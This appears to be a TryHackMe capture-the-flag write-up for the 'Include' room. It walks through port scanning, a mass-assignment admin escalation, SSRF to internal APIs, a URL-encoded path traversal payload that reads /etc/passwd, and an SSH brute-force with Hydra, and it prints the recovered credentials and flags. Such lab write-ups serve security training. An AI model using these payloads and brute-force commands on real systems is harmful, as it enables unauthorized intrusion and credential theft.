---
title: "TryHackMe - Include"
date: 2025-05-17 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [LFI, privilege escalation, enumeration, web exploitation]
---

## Reconnaissance

As always, I began the challenge with a comprehensive network scan using **Nmap**. My goal was to identify all open ports and services running on the target machine:


```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- -A 10.10.169.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 06:26 EDT
Nmap scan report for 10.10.169.164
Host is up (0.065s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f1:f1:27:3d:4c:d9:85:87:2f:a0:00:8f:e9:48:d3:64 (RSA)
|   256 bd:d7:6b:7f:05:77:52:a6:f0:12:2c:cb:7c:bf:0e:e2 (ECDSA)
|_  256 18:a6:17:92:36:e4:83:af:01:02:23:e1:76:48:e3:e2 (ED25519)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES TOP PIPELINING AUTH-RESP-CODE UIDL CAPA SASL STLS
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: Pre-login IMAP4rev1 post-login LOGINDISABLEDA0001 listed have LOGIN-REFERRALS LITERAL+ ID STARTTLS capabilities more SASL-IR OK ENABLE IDLE
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: Pre-login IMAP4rev1 SASL-IR post-login listed have LOGIN-REFERRALS AUTH=PLAIN ID IDLE capabilities more AUTH=LOGINA0001 OK ENABLE LITERAL+
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_pop3-capabilities: RESP-CODES TOP PIPELINING AUTH-RESP-CODE UIDL CAPA SASL(PLAIN LOGIN) USER
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   63.13 ms 10.23.0.1
2   63.15 ms 10.10.169.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.17 seconds

```


The output revealed several services of interest:

- SSH on port 22

- SMTP, POP3, IMAP (standard mail services) on ports 25, 110, 143

- Secure mail services on ports 993, 995

Web services on:

- Port 4000 (Node.js Express)

- Port 50000 (Apache 2.4.41)

Notably, port 4000 hosted a login page.


## Accessing the Web Application

Visiting http://10.10.169.164:4000/ presented me with a login form. Using the common credentials `guest:guest`, I successfully logged in.

After authentication, I landed on a user dashboard titled `"Friend Details"`, which displayed JSON-like:

![friendsdetails](/images/include/1isadmintrue.jpg)


It seemed the web application was reflecting user input directly into the backend user object. I used this opportunity to elevate my privileges by submitting:

- Activity Type: isAdmin

- Activity Name: true

![2](/images/include/2.jpg)

This effectively updated my guest account to have admin rights. Upon refreshing, a new admin dashboard appeared at:


```
http://10.10.169.164:4000/admin/api
```

![apidashboard](/images/include/3apidashboard.jpg)


The admin panel listed sensitive internal API endpoints, including:

```
GET http://127.0.0.1:5000/internal-api
GET http://127.0.0.1:5000/getAllAdmins101099991
```

These routes were accessible only via localhost, suggesting the need for SSRF or LFI to exploit.


Under the "Settings" tab of the admin panel, there was a field to update the Banner Image URL. 

![4](/images/include/4updatebanner.jpg)


I injected the second API endpoint as the URL:

```
http://127.0.0.1:5000/getAllAdmins101099991
```

the result is :

![5](/images/include/5api.jpg)

The server returned a base64-encoded response embedded in a data: URI. I decoded this using [CyberChef](https://gchq.github.io/CyberChef/) 

![6](/images/include/6cyberchef.jpg)

and recovered valid credentials:

```json
{
"ReviewAppUsername":"admin",
"ReviewAppPassword":"admin@!!!",
"SysMonAppUsername":"administrator",
"SysMonAppPassword":"S$9$qk6d#**LQU"
}
```

## Accessing the SysMonApp Interface

Using the extracted credentials, I accessed the system monitoring application at:

```
http://10.10.169.164:50000
```

- Login: administrator
- Password: S$9$qk6d#**LQU

Upon successful login, I retrieved the first flag:

**THM{!50_55Rf_1S_d_k3Y??!}**

## Discovering a Local File Inclusion (LFI)

While examining the page source, I discovered a reference to a parameterized image:

![7](/images/include/7profilephp.jpg)

```
http://10.10.169.164:50000/profile.php?img=profile.png
```

I suspected a possible **LFI vulnerability** in this parameter. To test it, I began injecting various traversal sequences.

After trial and error, I found that the application accepted deeply nested traversal patterns double-encoded using URL encoding (%2F for /). The working payload looked like this:

```
....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
```

The full request became:

```
http://10.10.169.164:50000/profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd

```
This successfully returned the contents of `/etc/passwd`, confirming the LFI.

From the output, I identified two valid system users `joshua` and `charles`:

![8](/images/include/8lfiwork.jpg)

## Gaining SSH Access via Brute Force

Since **SSH** was open on port **22** , I attempted to brute-force a password for one of the discovered users. I used **Hydra**  with the popular `rockyou.txt` wordlist:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l joshua -P /usr/share/wordlists/rockyou.txt ssh://10.10.169.164
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-27 07:38:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.169.164:22/
[22][ssh] host: 10.10.169.164   login: joshua   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-27 07:38:19
```

After a short time, Hydra found valid credentials:

- Username: joshua

- Password: 123456


After successfully establishing an **SSH** session as the `joshua` user, the next step is to locate the final flag. According to the CTF creator's hint, the flag is hidden within the `/var/www/html` directory. I proceed to enumerate the files in this location and ultimately retrieve the final flag.

```console
joshua@filepath:/$ cd /var
joshua@filepath:/var$ ls
backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www
joshua@filepath:/var$ cd www
joshua@filepath:/var/www$ ls
html
joshua@filepath:/var/www$ cd html
joshua@filepath:/var/www/html$ ls
505eb0fb8a9f32853b4d955e1f9123ea.txt  index.php    templates
api.php                               login.php    uploads
auth.php                              logout.php
dashboard.php                         profile.php
joshua@filepath:/var/www/html$ cat 505eb0fb8a9f32853b4d955e1f9123ea.txt
THM{505eb0fb8a9f32853b4d955e1f9123ea}
joshua@filepath:/var/www/html$ 
```